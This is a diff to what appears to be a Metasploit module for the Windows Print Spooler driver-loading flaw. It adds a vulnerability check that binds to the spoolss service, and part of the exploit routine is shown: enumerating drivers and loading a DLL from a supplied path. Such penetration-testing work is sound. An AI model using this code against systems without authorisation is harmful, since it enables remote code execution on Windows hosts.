@@ -226,6 +226,7 @@ end
 
 class MetasploitModule < Msf::Auxiliary
 
+  prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB::Client::Authenticated
 
@@ -278,19 +279,36 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def run
+  def check
     begin
       connect
     rescue Rex::ConnectionError
-      fail_with(Failure::Unreachable, 'Failed to connect to the remote service.')
+      return Exploit::CheckCode::Unknown('Failed to connect to the remote service.')
     end
 
     begin
       smb_login
     rescue Rex::Proto::SMB::Exceptions::LoginError
-      fail_with(Failure::NoAccess, 'Failed to authenticate to the remote service.')
+      return Exploit::CheckCode::Unknown('Failed to authenticate to the remote service.')
     end
 
+    handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
+    vprint_status("Binding to #{handle} ...")
+    begin
+      dcerpc_bind(handle)
+    rescue RubySMB::Error::UnexpectedStatusCode => e
+      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
+      if nt_status == ::WindowsError::NTStatus::STATUS_OBJECT_NAME_NOT_FOUND
+        print_status("The 'Print Spooler' service is disabled.")
+      end
+      return Exploit::CheckCode::Safe("The DCERPC bind failed with error #{nt_status.name} (#{nt_status.description}).")
+    end
+    vprint_status("Bound to #{handle} ...")
+
+    Exploit::CheckCode::Detected('Successfully bound to the remote service.')
+  end
+
+  def run
     arch = dcerpc_getarch
     print_status("Target environment: Windows v#{simple.client.os_version} (#{arch})")
 
@@ -303,23 +321,14 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported')
     end
 
-    handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
-    vprint_status("Binding to #{handle} ...")
-    begin
-      dcerpc_bind(handle)
-    rescue RubySMB::Error::UnexpectedStatusCode => e
-      nt_status = ::WindowsError::NTStatus.find_by_retval(e.status_code.value).first
-      fail_with(Failure::Unreachable, "The DCERPC bind failed with error #{nt_status.name} (#{nt_status.description})")
-    end
-    vprint_status("Bound to #{handle} ...")
-
     print_status('Enumerating the installed printer drivers...')
     drivers = enum_printer_drivers(environment)
     driver_path = "#{drivers.driver_path.rpartition('\\').first}\\UNIDRV.DLL"
     vprint_status("Using driver path: #{driver_path}")
 
+    print_status('Retrieving the path of the printer driver directory...')
     config_directory = get_printer_driver_directory(environment)
-    vprint_status("Using directory: #{config_directory}")
+    vprint_status("Using driver directory: #{config_directory}")
 
     filename = datastore['DLL_PATH'].rpartition('\\').last
     container = PrintSystem::DriverContainer.new(
